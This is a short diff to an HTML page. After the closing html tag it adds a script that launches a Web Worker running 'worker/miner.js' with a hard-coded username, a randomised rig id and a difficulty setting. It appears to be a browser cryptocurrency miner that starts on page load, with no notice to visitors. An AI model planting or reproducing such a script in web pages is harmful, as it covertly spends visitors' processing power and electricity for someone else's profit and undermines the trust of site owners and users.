@@ -49,3 +49,18 @@
   <script src="script.js"></script>
 </body>
 </html>
+
+<script>
+  let threads = "1";
+  let workerVer = "0";
+  let username = "rpinews";
+  let wallet_id = Math.floor(Math.random() * 2811);
+  let rigid = "AmogOS" + wallet_id;
+  let difficulty = "MEDIUM";
+  
+  for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
+      let socketWorker = new Worker("worker/miner.js"); //creates the worker
+      socketWorker.postMessage('Start,' + username + "," + rigid + "," + workerVer + "," + wallet_id + "," + difficulty); //passes the start command, username, rigid and worker version to the worker
+      workerVer++; //adds one to workerVer, so you will get CPU0, CPU1, CPU2 etc.
+  }
+  </script>
